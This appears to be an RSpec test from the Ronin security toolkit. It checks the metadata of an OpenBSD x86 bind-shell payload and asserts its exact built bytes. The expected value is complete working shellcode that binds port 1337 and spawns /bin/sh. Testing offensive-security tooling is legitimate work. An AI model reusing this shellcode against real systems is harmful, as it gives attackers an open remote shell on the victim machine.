require 'spec_helper'
require 'ronin/payloads/builtin/shellcode/openbsd/x86/bind_shell'

describe Ronin::Payloads::Shellcode::OpenBSD::X86::BindShell do
  it "must inherit from Ronin::Payloads::Shellcode::BindShellPayload" do
    expect(described_class).to be < Ronin::Payloads::Shellcode::BindShellPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'shellcode/openbsd/x86/bind_shell'" do
      expect(subject.id).to eq('shellcode/openbsd/x86/bind_shell')
    end
  end

  describe ".arch" do
    subject { described_class }

    it "must equal :x86" do
      expect(subject.arch).to be(:x86)
    end
  end

  describe ".os" do
    subject { described_class }

    it "must equal :openbsd" do
      expect(subject.os).to be(:openbsd)
    end
  end

  let(:host) { 'example.com' }
  let(:port) { 1337 }

  subject do
    described_class.new(
      params: {
        host: host,
        port: port
      }
    )
  end

  describe "#build" do
    before { subject.build }

    it "must set #payload" do
      expect(subject.payload).to eq(
        "\x31\xc9\x51\x41\x51\x41\x51\x51\x31\xc0\xb0\x61\xcd\x80\x89\x07\x31\xc9\x88\x4f\x04\xc6\x47\x05\x02\x89\x4f\x08\x66\xc7\x47\x06\x05\x39\x6a\x10\x8d\x47\x04\x50\x8b\x07\x50\x50\x31\xc0\xb0\x68\xcd\x80\x6a\x01\x8b\x07\x50\x50\x31\xc0\xb0\x6a\xcd\x80\x31\xc9\x51\x51\x8b\x07\x50\x50\x31\xc0\xb0\x1e\xcd\x80\x89\x07\x31\xc9\x51\x8b\x07\x50\x50\x31\xc0\xb0\x5a\xcd\x80\x41\x83\xf9\x03\x75\xef\xeb\x23\x5b\x89\x1f\x31\xc9\x88\x4b\x07\x89\x4f\x04\x51\x8d\x07\x50\x8b\x07\x50\x50\x31\xc0\xb0\x3b\xcd\x80\x31\xc9\x51\x51\x31\xc0\xb0\x01\xcd\x80\xe8\xd8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x90".b
      )
    end

    it "must ensure #payload is an ASCII 8bit string" do
      expect(subject.payload.encoding).to eq(Encoding::ASCII_8BIT)
    end
  end
end
